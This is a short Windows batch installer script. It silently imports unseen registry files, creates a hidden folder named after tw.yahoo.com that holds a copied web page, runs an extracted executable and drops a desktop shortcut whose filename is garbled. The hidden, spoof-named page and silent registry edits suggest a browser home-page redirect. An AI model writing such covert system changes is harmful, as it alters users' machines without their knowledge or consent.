@ECHO OFF
SET COPYCMD=/Y
if exist c:\datas ren c:\datas tempdatas

copy 1.reg c:\ > nul
md c:\tw.yahoo.com
attrib +h c:\tw.yahoo.com
copy tw.yahoo.com\index.htm c:\tw.yahoo.com > nul

COPY CVIEW.INI C:\ > nul

COPY datas C:\datas.EXE > nul

IF %OS%==Windows_NT Goto WinNT
%winbootdir%\regedit.exe /s r1.reg
%winbootdir%\regedit.exe /s c:\1.reg
COPY CD.PIF C:\WINDOWS\DESKTOP\传ヾ贾场.PIF > nul
Goto Cont1

:WinNT
%windir%\regedit.exe /s r2.reg
%windir%\regedit.exe /s c:\1.reg
COPY CD.PIF C:\Docume~1\AllUse~1\\传ヾ贾场.PIF > nul

:Cont1
cls

if exist c:\tempdatas deltree /y c:\tempdatas

CD\
C:
CD\

datas > nul
DEL C:\datas.EXE
CLS
CD datas
CV help.txt
cd\
exit
